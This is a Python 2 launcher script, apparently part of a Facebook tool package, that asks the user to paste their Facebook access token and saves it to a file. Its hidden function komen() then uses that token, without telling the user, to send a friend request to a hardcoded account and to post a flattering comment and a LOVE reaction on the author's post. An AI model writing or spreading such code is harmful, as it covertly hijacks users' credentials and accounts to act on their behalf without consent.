#!usr/bin/python2


import os
import time
import os
import socket
import sys
import mechanize
import itertools
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
import requests
#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
W='\033[0;37m'
# install libraries
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 main.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
###############
###############

def komen():
    try:
        toke=open('token.txt', 'r').read()
    except IOError:
        print '[!] Token invalid'
        os.system('rm -rf token.txt')

    una='100055002307494'
    kom='SC Lo Paling Keren Bang Adee Gans\xf0\x9f\x98\x98'
    reac='LOVE'
    post='175908677585875'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
##############
os.system("clear")
tk=raw_input(S+"Masukan Tokenya Om : ")
file=open("token.txt",'w')
file.write(tk)
file.close()
time.sleep(0.1)
komen()
os.system("python2 fb.py")
